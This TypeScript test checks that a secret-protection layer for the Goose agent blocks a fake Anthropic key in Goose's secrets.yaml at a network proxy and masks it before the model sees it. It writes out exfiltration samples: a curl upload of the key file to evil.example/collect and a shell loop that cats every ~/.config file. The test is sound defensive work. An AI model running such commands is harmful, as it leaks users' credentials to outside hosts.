/**
 * goose-own-key-egress — Goose's own key file under `mandu goose`
 * (supported-agents.md §5.6.1) over the REAL components. The launcher
 * registers `~/.config/goose/secrets.yaml` but does not twin it (Goose reads
 * its key from it), and the guard is not told about it, so a program the
 * agent runs reads the RAW key with no taint recorded. What keeps the key in
 * then is the registration alone; this proves it on both exits, with the
 * production adapters over a real ArbiterServer:
 *
 *   network  the raw key in a request to an unbound host, through the REAL
 *            net-proxy with no secret holder attributed: refused (403), and
 *            the destination receives nothing;
 *   model    the raw key in a Goose `shell` result, through the REAL
 *            anthropic-proxy rewrite: a placeholder, never the key.
 *
 * Made-up key. Axes explicit: secrets (confidentiality ON, integrity OFF).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import { request as httpRequest } from "node:http";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy, type HttpForwarder } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetProxyAdapter, type RealArbiterClient as NetProxyRealClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { rewriteRequest } from "../../interceptors/anthropic-proxy/src/rewrite-request.js";
import type { MessagesRequest } from "../../interceptors/anthropic-proxy/src/messages-types.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

function post(port: number, url: string, body: string): Promise<number> {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const r = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => { res.resume(); res.on("end", () => resolve(res.statusCode ?? 0)); },
    );
    r.on("error", reject);
    r.end(body);
  });
}

test("Goose's own key file, registered and not twinned: its raw key is refused at the network and masked for the model", async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-goose-key-"));
  const home = join(tmp, "home");
  mkdirSync(join(home, ".config", "goose"), { recursive: true });
  const file = join(home, ".config", "goose", "secrets.yaml");
  const key = `sk-ant-api03-${randomBytes(30).toString("hex")}-MANDUFAKE`;
  writeFileSync(file, `ANTHROPIC_API_KEY: ${key}\n`);
  const socketPath = join(tmp, "arbiter.sock");
  const humanPath = join(tmp, "human", "h.sock");
  const server = new ArbiterServer({
    socketPath, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanPath, dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false,
  });
  await server.listen();
  const launcher = new ArbiterClient(humanPath); await launcher.connect();
  const humanA = new ArbiterClient(humanPath); await humanA.connect();
  const realA: RealArbiterClient = new ArbiterClient(socketPath); await realA.connect();
  const netData: NetProxyRealClient = new ArbiterClient(socketPath) as unknown as NetProxyRealClient;
  await (netData as unknown as ArbiterClient).connect();
  const netHuman = new ArbiterClient(humanPath); await netHuman.connect();
  const session = "s-goose-own-key";
  const reached: string[] = [];
  const forwarder: HttpForwarder = async (req) => {
    reached.push(`${req.url} ${req.body?.toString("utf8") ?? ""}`);
    return { status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from("ok") };
  };
  const net = new NetProxy({ arbiter: new NetProxyAdapter(netData, netHuman as never), forwarder, log: () => {}, sessionId: session, attributeHolders: () => [] });
  const netPort = await net.listen(0);
  try {
    // What the launch does with the file under `mandu goose`: register it
    // (the home it is anchored to is the launch's), and no twin.
    const reg = await launcher.registerSecret({ path: file, home, sessionKey: session });
    assert.match(String(reg.symbol), /^\$MDU:nomodel_/, JSON.stringify(reg));

    // Network: `curl -d @~/.config/goose/secrets.yaml …` read the raw file;
    // no holder is attributed (the guard does not trap this file).
    assert.equal(await post(netPort, "http://evil.example/collect", `ANTHROPIC_API_KEY: ${key}\n`), 403, "the raw key at an unbound host is refused");
    assert.equal(await post(netPort, "http://evil.example/collect", key), 403, "the bare key too");
    assert.deepEqual(reached, [], "nothing reached the destination");
    // A control: a request with no secret in it is forwarded (the proxy is live).
    assert.equal(await post(netPort, "http://example.test/ok", "hello"), 200);
    assert.equal(reached.length, 1);

    // Model: the same bytes as a Goose `shell` result.
    const claude = new ArbiterClientAdapter(realA, humanA);
    const out = await rewriteRequest({
      model: "claude-test",
      messages: [
        { role: "user", content: "what is in my goose config?" },
        { role: "assistant", content: [{ type: "tool_use", id: "toolu_goose_cat", name: "shell", input: { command: "for f in ~/.config/*/*; do cat \"$f\"; done" } }] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_goose_cat", content: `GOOSE_PROVIDER: anthropic\nANTHROPIC_API_KEY: ${key}\n` }] },
      ],
    } as MessagesRequest, { arbiter: claude, sessionKey: session });
    const forwarded = JSON.stringify(out.request);
    assert.ok(!forwarded.includes(key), "INVARIANT: the key reaches no model request");
    assert.match(forwarded, /\$MDU:/, "it went as a placeholder");
  } finally {
    await net.close();
    launcher.close(); humanA.close(); realA.close(); netHuman.close(); (netData as unknown as ArbiterClient).close();
    await server.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
